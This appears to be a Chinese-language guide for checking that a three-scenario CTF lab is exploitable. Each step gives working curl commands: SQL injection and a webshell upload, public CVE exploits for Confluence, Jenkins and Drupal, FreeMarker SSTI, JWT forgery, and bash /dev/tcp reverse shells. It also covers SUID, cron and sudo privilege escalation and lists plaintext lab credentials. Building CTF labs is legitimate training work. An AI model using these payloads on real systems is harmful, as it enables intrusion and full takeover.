# GDJ CTF 攻击链验证指南

## 验证前准备

```bash
# 设置环境变量 (根据实际部署调整)
export A1_EXT=<VM-A1外部IP>      # 从 virsh domifaddr ctfd-a1 获取
export A1_INT=192.168.100.1
export A2_INT=192.168.100.2
export B1_EXT=<VM-B1外部IP>
export B1_INT=192.168.110.1
export B2_INT=192.168.110.2
export C1_EXT=<VM-C1外部IP>
export C1_INT=192.168.120.1
export C2_INT=192.168.120.2
```

## 场景A — 融媒体内容管理系统 (1610分)

### A-1: 备份文件泄露 (20分)

**目标**: 通过nginx autoindex发现SQL备份

```bash
# 访问备份目录
curl http://$A1_EXT/backup/

# 预期: 列出 cms_20240101.sql.gz 文件
# 下载备份
curl http://$A1_EXT/backup/cms_20240101.sql.gz -o cms_backup.sql.gz
zcat cms_backup.sql.gz | head -50

# 预期: 在SQL中发现admin/testuser密码hash
# admin: f0916d59b2d497402968dbdd3641ddbe (md5(md5(Admin@Cms2024)))
# testuser: 69b486559229738facdfa7536fba1b95 (md5(md5(Test@123456)))
```

**验证通过**: 能从`/backup/`下载并解压出SQL文件，内含密码hash。

---

### A-2: 搜索框SQL注入 (200分)

**目标**: 通过搜索框UNION注入提取CMS数据库

```bash
# 确认搜索接口存在
curl -s http://$A1_EXT/ | grep -i search

# SQL注入 — 探测列数 (ORDER BY)
curl -s "http://$A1_EXT/?search/" -X POST -d "keyword=' ORDER BY 1--" | head -20

# SQL注入 — UNION提取数据
curl -s "http://$A1_EXT/?search/" -X POST \
  -d "keyword=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--"

# 提取admin密码
curl -s "http://$A1_EXT/?search/" -X POST \
  -d "keyword=' UNION SELECT username,password,3,4,5,6,7,8,9,10,11,12,13,14,15 FROM ay_user--"

# 预期: 返回admin的MD5 hash
```

**验证通过**: SQL注入成功提取`ay_user`表中数据。

---

### A-3: 源码泄露database.php (50分)

**目标**: 读取config/database.php获取DB凭据

```bash
curl http://$A1_EXT/config/database.php

# 预期: 返回PHP源码，包含MySQL连接信息
# host: 192.168.100.2
# user: cmsuser
# pass: Cm5Us3r@2024!
# db:   cms
```

**验证通过**: 直接访问返回database.php源码，泄露内网MySQL凭据。

---

### A-4: MySQL LOAD_FILE读文件 (250分)

**目标**: 利用SQL注入+LOAD_FILE()读取VM-A2上的MySQL root配置文件

```bash
# 使用A-2的SQL注入 + A-3的DB凭据，执行LOAD_FILE
# 方式1: 通过SQL注入直接LOAD_FILE
curl -s "http://$A1_EXT/?search/" -X POST \
  -d "keyword=' UNION SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/root.cnf'),2,3,4,5,6,7,8,9,10,11,12,13,14,15--"

# 预期输出:
# [client]
# user=root
# password=R00t@Mysql#2024

# 方式2: 如果有MySQL客户端，直接连接
mysql -h $A2_INT -u cmsuser -p'Cm5Us3r@2024!' -e "SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/root.cnf');"
```

**验证通过**: LOAD_FILE返回MySQL root配置文件内容 (`R00t@Mysql#2024`)。

---

### A-5: UEditor文件上传webshell (250分)

**目标**: 利用PbootCMS的UEditor上传.phtml webshell

```bash
# 检查上传目录是否存在
curl -s -o /dev/null -w '%{http_code}' http://$A1_EXT/upload/

# UEditor上传接口 (PbootCMS魔改版)
# POST multipart上传 .phtml 文件到 /static/upload/
curl -X POST http://$A1_EXT/static/upload/ \
  -F "file=@shell.phtml" \
  -F "action=upload"

# 访问上传的shell
curl http://$A1_EXT/upload/shell.phtml?cmd=id

# 预期: 返回 uid=33(www-data) gid=33(www-data)
```

**验证通过**: 上传的.phtml文件可执行PHP代码。

---

### A-6: SUID find提权 (100分)

**目标**: 利用SUID find从operator提权到root

```bash
# SSH登录 (使用A-3泄露的密码 或 A-4 root密码)
ssh operator@$A1_INT
# Password: 0p3rat0r@GDJ

# 发现SUID文件
find / -perm -u=s -type f 2>/dev/null

# 关键发现: /usr/bin/find 有SUID位
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root ... /usr/bin/find

# 利用SUID find提权
/usr/bin/find . -exec /bin/sh -p \;

# 或创建SUID shell
/usr/bin/find /tmp -name anything -exec chmod u+s /bin/bash \;
/bin/bash -p

# 预期: 获得root shell
id  # uid=0(root)
```

**验证通过**: SUID find成功获得root shell。

---

### A-7: Confluence CVE-2022-26134 OGNL注入 (500分)

**目标**: 通过Confluence未授权的OGNL注入获取VM-A2 shell

```bash
# 确认Confluence可访问 (从VM-A1)
curl -s http://$A2_INT:8090/ | grep -i confluence

# CVE-2022-26134 POC — OGNL注入RCE
curl -v "http://$A2_INT:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"

# 预期: Response Header X-Cmd-Response: uid=...
# 如果返回200且包含X-Cmd-Response，说明RCE成功

# 反弹shell (在VM-A1上)
# 1. 在VM-A1启动监听: nc -lvnp 4444
# 2. 执行反弹shell payload
curl -s "http://$A2_INT:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.100.1/4444%200%3E%261%27%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
```

**验证通过**: OGNL注入执行`id`返回`uid=...`（confluence用户），反弹shell成功。

---

### A-8: Confluence cron脚本提权 (240分)

**目标**: 从confluence用户通过可写cron脚本提权到root

```bash
# 在Confluence shell中
id  # uid=... (confluence)

# 发现可写cron脚本
ls -la /opt/confluence_health_check.sh
# -rwxrwxrwx 1 root root ... /opt/confluence_health_check.sh

cat /opt/confluence_health_check.sh
# systemctl status confluence > /dev/null 2>&1 || systemctl restart confluence

# 写入提权后门
echo '#!/bin/bash' > /opt/confluence_health_check.sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/confluence_health_check.sh

# 等待10分钟(cron触发) 或 手动触发
# 10分钟后:
/tmp/rootbash -p
id  # uid=0(root)
```

**验证通过**: 修改cron脚本后获得SUID bash，root权限。

---

## 场景B — 广电网络监控仪表盘 (1590分)

### B-1: 默认口令登录 (20分)

```bash
# 尝试默认密码登录
curl -X POST http://$B1_EXT/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# 预期: 返回 200 OK + JWT token 或 session cookie
```

**验证通过**: admin/admin123成功登录。

---

### B-2: SSRF获取JWT (200分)

```bash
# 利用SSRF访问内网API Gateway获取token
curl "http://$B1_EXT/api/fetch?url=http://$B2_INT:8080/api/admin/token"

# 预期: 返回API Gateway的内部JWT token
# 如果有限制，尝试绕过:
curl "http://$B1_EXT/api/fetch?url=http://192.168.110.2:8080/api/admin/token"
```

**验证通过**: SSRF成功读取内网API Gateway的admin token。

---

### B-3: Flask命令注入RCE (300分)

```bash
# 使用B-2获取的JWT或B-1的session执行命令
curl -X POST http://$B1_EXT/api/exec \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -d '{"cmd":"id"}'

# 预期: 返回的命令执行结果，uid=www-data

# 建立反弹shell
curl -X POST http://$B1_EXT/api/exec \
  -H "Content-Type: application/json" \
  -d '{"cmd":"bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\""}'
```

**验证通过**: `id` 命令执行成功，返回www-data用户信息。

---

### B-4: 配置文件泄露PG只读 (100分)

```bash
# 在VM-B1 shell中读取配置文件
cat /opt/configs/api_config.yaml

# 预期输出:
# database_ro:
#   user: monitor_ro
#   password: M0n1t0rR0@2024!
#   database: monitor
```

**验证通过**: `api_config.yaml` 包含monitor_ro凭据。

---

### B-5: 环境变量泄露PG superuser (100分)

```bash
# 查看systemd服务环境变量
cat /etc/systemd/system/monitor-dashboard.service
# 或
systemctl show monitor-dashboard | grep Environment

# 预期: Environment=PG_USER=monitor PG_PASS=M0n1t0r@DB#2024

# 连接PostgreSQL验证
psql -h $B2_INT -U monitor -d monitor
# Password: M0n1t0r@DB#2024
```

**验证通过**: systemd service文件泄露superuser凭据。

---

### B-6: crontab提权root (100分)

```bash
# 在VM-B1 shell中
id  # www-data

# 发现可写的cleanup.sh
ls -la /opt/monitor/cleanup.sh
# -rwxrwxrwx 1 root root ... /opt/monitor/cleanup.sh

# 替换为提权payload
echo '#!/bin/bash' > /opt/monitor/cleanup.sh
echo 'chmod u+s /bin/bash' >> /opt/monitor/cleanup.sh

# 等待5分钟(cron */5) 或手动执行
sleep 300
/bin/bash -p
id  # uid=0(root)
```

**验证通过**: 修改cleanup.sh后获得root。

---

### B-7: Jenkins CVE-2024-23897 文件读取 + Groovy RCE (500分)

```bash
# Step 1: 确认Jenkins可访问
curl -s http://$B2_INT:8081/ | head -5

# Step 2: 使用CLI args4j文件读取 (无需认证)
# 下载jenkins-cli.jar (或使用任意jar)
cd /tmp
wget http://$B2_INT:8081/jnlpJars/jenkins-cli.jar 2>/dev/null || true

# CVE-2024-23897: 通过CLI help命令读取文件
java -jar jenkins-cli.jar -s http://$B2_INT:8081/ help "@/etc/passwd" 2>&1

# 读取Jenkins初始密码
java -jar jenkins-cli.jar -s http://$B2_INT:8081/ help "@/var/lib/jenkins/secrets/initialAdminPassword" 2>&1

# Step 3: 使用初始密码登录Jenkins → Manage Jenkins → Script Console → Groovy RCE
# Groovy payload:
# def sout = new StringBuilder(), serr = new StringBuilder()
# def proc = 'bash -c "bash -i >& /dev/tcp/192.168.110.1/4444 0>&1"'.execute()
# proc.consumeProcessOutput(sout, serr)
# proc.waitForOrKill(1000)
# println "out> $sout err> $serr"
```

**验证通过**: CLI帮助命令读取`/etc/passwd`或`initialAdminPassword`。

---

### B-8: Jenkins backup提权root (270分)

```bash
# 在Jenkins shell中 (groovy RCE获得)
id  # jenkins

# 发现可写backup脚本
ls -la /opt/jenkins_backup.sh
# -rwxrwxrwx 1 root root ... /opt/jenkins_backup.sh

# 写入提权payload
echo '#!/bin/bash' > /opt/jenkins_backup.sh
echo 'chmod u+s /bin/bash' >> /opt/jenkins_backup.sh

# 等待凌晨2:00 cron执行，或手动触发
# 手动: sudo /opt/jenkins_backup.sh (jenkins通常没有sudo)
# cron将在每天2:00 AM执行

# cron执行后:
/bin/bash -p
id  # uid=0(root)
```

**验证通过**: 修改后等待cron执行，获得SUID bash。

---

## 场景C — 内部办公OA系统 (1590分)

### C-1: 注册captcha后门 (20分)

```bash
# 使用验证码后门 gdj2024 注册新用户
curl -X POST http://$C1_EXT/register \
  -F "username=hacker" \
  -F "password=Hacker@123" \
  -F "confirmPassword=Hacker@123" \
  -F "captcha=gdj2024"

# 预期: 注册成功 (任意验证码值gdj2024可通过)
# 或尝试:
curl "http://$C1_EXT/register?captcha=gdj2024"
```

**验证通过**: 使用`gdj2024`作为captcha成功注册账号。

---

### C-2: JWT alg=none伪造admin (300分)

```bash
# 登录获取正常JWT
curl -X POST http://$C1_EXT/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin@OA2024"}'

# 观察返回的JWT结构 (三段Base64)
# eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjF9.signature

# 伪造JWT (alg=none, user=admin/userId=1)
# Header:  {"alg":"none","typ":"JWT"}
# Payload: {"userId":1,"username":"admin"}
# 编码后:  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWRtaW4ifQ.

# 直接使用不签名访问admin API
curl -s http://$C1_EXT/api/admin/users \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWRtaW4ifQ."

# 预期: 返回用户列表
```

**验证通过**: 伪造的none算法JWT成功访问`/api/admin/users`。

---

### C-3: /api/admin/export SQL注入 (250分)

```bash
# 使用C-2的JWT
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWRtaW4ifQ."

# SQL注入探测
curl -s "http://$C1_EXT/api/admin/export?username=admin'" \
  -H "Authorization: Bearer $TOKEN"

# UNION注入 (列数探测)
curl -s "http://$C1_EXT/api/admin/export?username=' UNION SELECT 1--" \
  -H "Authorization: Bearer $TOKEN"

# 提取内部数据库数据
curl -s "http://$C1_EXT/api/admin/export?username=' UNION SELECT password FROM oa.users--" \
  -H "Authorization: Bearer $TOKEN"

# 预期: 返回VM-C2上OA数据库的用户密码
```

**验证通过**: SQL注入成功提取VM-C2数据库数据。

---

### C-4: Druid配置泄露LDAP密码 (50分)

```bash
# 访问Spring Boot Actuator druid监控 (无认证)
curl http://$C1_EXT/druid/datasource.json

# 或检查其他druid端点
curl http://$C1_EXT/druid/index.html
curl http://$C1_EXT/druid/websession.html

# 搜索LDAP密码
curl -s http://$C1_EXT/druid/datasource.json | grep -i pass

# 预期: datasource.json 包含数据库连接信息和可能的LDAP配置
```

**验证通过**: `/druid/datasource.json` 泄露数据库和LDAP连接信息。

---

### C-5: FreeMarker SSTI RCE (350分)

```bash
# 确认/mail/preview端点存在
curl -s -o /dev/null -w '%{http_code}' http://$C1_EXT/mail/preview

# FreeMarker SSTI — 命令执行探测
curl -X POST http://$C1_EXT/mail/preview \
  -H "Content-Type: application/json" \
  -d '{"template":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"}'

# 预期: 返回 uid=... (RuoYi进程用户)
# 如果返回500/403，可能Spring Boot已关闭exec

# 方式2: FreeMarker RCE via ClassLoader
curl -X POST http://$C1_EXT/mail/preview \
  -H "Content-Type: application/json" \
  -d '{"template":"${(\"freemarker.template.utility.Execute\"?new())(\"whoami\")}"}'

# 反弹shell
curl -X POST http://$C1_EXT/mail/preview \
  -H "Content-Type: application/json" \
  -d '{"template":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"bash -c \\\"bash -i >& /dev/tcp/192.168.120.1/4444 0>&1\\\"\")}"}'
```

**验证通过**: FreeMarker SSTI执行`id`返回Java进程用户信息。

---

### C-6: sudo tee提权root (100分)

```bash
# 在VM-C1 shell中 (通过C-5获得)
id  # tomcat (或RuoYi运行用户)

# 检查sudo权限
sudo -l
# (root) NOPASSWD: /usr/bin/tee

# 利用tee追加/etc/sudoers给自己提权
echo "tomcat ALL=(ALL) NOPASSWD: ALL" | sudo /usr/bin/tee -a /etc/sudoers

# 提权
sudo -i
id  # uid=0(root)

# 或者添加root authorized_keys
# echo "ssh-rsa ..." | sudo /usr/bin/tee -a /root/.ssh/authorized_keys
```

**验证通过**: 利用sudo tee追加/etc/sudoers后获得root。

---

### C-7: Drupal CVE-2018-7600 Drupalgeddon2 (500分)

```bash
# 确认Drupal运行
curl -s http://$C2_INT/ | head -10

# CVE-2018-7600 POC — 未认证RCE
# Step 1: 检查是否存在漏洞
curl -X POST "http://$C2_INT/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -d "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

# 预期: 返回JSON中包含命令执行结果 (uid=...)

# Step 2: 反弹shell
curl -X POST "http://$C2_INT/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -d "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=bash -c 'bash -i >& /dev/tcp/192.168.120.1/4444 0>&1'"

# 在VM-C1上监听: nc -lvnp 4444
```

**验证通过**: Drupalgeddon2执行`id`返回`uid=33(www-data)`。

---

### C-8: sudo find提权root (150分)

```bash
# 在VM-C2 shell中 (通过C-7获得)
id  # www-data 或 operator

# 切换到operator (如果还在www-data)
# su operator
# Password: 0p3rat0r@GDJ

# 检查sudo权限
sudo -l
# (root) NOPASSWD: /usr/bin/find

# sudo find提权
sudo find . -exec /bin/sh \;
# 或
sudo find /etc -name passwd -exec /bin/bash \;

id  # uid=0(root)
```

**验证通过**: sudo find执行/bin/sh获得root shell。

---

## 验证清单汇总

| # | 链ID | 验证项 | 自动化 | 状态 |
|---|------|--------|--------|------|
| 1 | A-1 | curl /backup/ 返回200列表sql.gz | 可 | [ ] |
| 2 | A-2 | SQL注入返回admin hash | 半自动 | [ ] |
| 3 | A-3 | /config/database.php返回源码 | 可 | [ ] |
| 4 | A-4 | LOAD_FILE返回root.cnf | 半自动 | [ ] |
| 5 | A-5 | 上传.phtml可执行PHP | 半自动 | [ ] |
| 6 | A-6 | SUID find → root | 手动 | [ ] |
| 7 | A-7 | Confluence OGNL → RCE | 半自动 | [ ] |
| 8 | A-8 | cron脚本提权 | 手动 | [ ] |
| 9 | B-1 | admin/admin123登录成功 | 可 | [ ] |
| 10 | B-2 | SSRF内网请求返回token | 半自动 | [ ] |
| 11 | B-3 | 命令注入id返回www-data | 半自动 | [ ] |
| 12 | B-4 | api_config.yaml含密码 | 手动 | [ ] |
| 13 | B-5 | systemd env含PG密码 | 手动 | [ ] |
| 14 | B-6 | cron提权 | 手动 | [ ] |
| 15 | B-7 | Jenkins CLI读文件 | 半自动 | [ ] |
| 16 | B-8 | Jenkins backup提权 | 手动 | [ ] |
| 17 | C-1 | captcha=gdj2024注册成功 | 可 | [ ] |
| 18 | C-2 | JWT none访问api/admin/users | 可 | [ ] |
| 19 | C-3 | SQL注入提取数据 | 半自动 | [ ] |
| 20 | C-4 | /druid/datasource.json泄露 | 可 | [ ] |
| 21 | C-5 | FreeMarker SSTI执行id | 半自动 | [ ] |
| 22 | C-6 | sudo tee提权 | 手动 | [ ] |
| 23 | C-7 | Drupal CVE-2018-7600 RCE | 半自动 | [ ] |
| 24 | C-8 | sudo find提权 | 手动 | [ ] |

**可自动化**: 12/24条可通过curl/nc检查入口点
**需手动**: 提权链和交互式利用需手动验证
